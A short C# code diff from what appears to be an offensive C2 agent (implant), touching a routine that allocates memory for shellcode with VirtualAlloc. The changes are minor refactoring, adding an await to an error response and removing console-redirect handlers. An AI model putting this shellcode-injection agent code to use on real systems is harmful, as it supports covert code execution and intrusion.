@@ -60,7 +60,6 @@ namespace Agent
 
             //Allocate shellcode as RW
             IntPtr bufAddr = Native.VirtualAlloc(IntPtr.Zero, (uint)buffer.Length, 0x1000, 0x04);
-
             if (bufAddr == IntPtr.Zero)
             {
                 await messageManager.AddResponse(new ResponseResult()
@@ -96,7 +95,7 @@ namespace Agent
             }
             catch
             {
-                messageManager.AddResponse(new ResponseResult()
+                await messageManager.AddResponse(new ResponseResult()
                 {
                     completed = false,
                     process_response = new Dictionary<string, string> { { "message", "0x44" } },
@@ -104,17 +103,6 @@ namespace Agent
                     status = "error"
                 });
             }
-        }
-
-
-        private void Redirector_WriteEvent(object? sender, ConsoleWriterEventArgs e)
-        {
-            messageManager.Write(e.Value, this.output_task_id, false);
-        }
-
-        private void Redirector_WriteLineEvent(object? sender, ConsoleWriterEventArgs e)
-        {
-            messageManager.WriteLine(e.Value, this.output_task_id, false);
         }
     }
 }
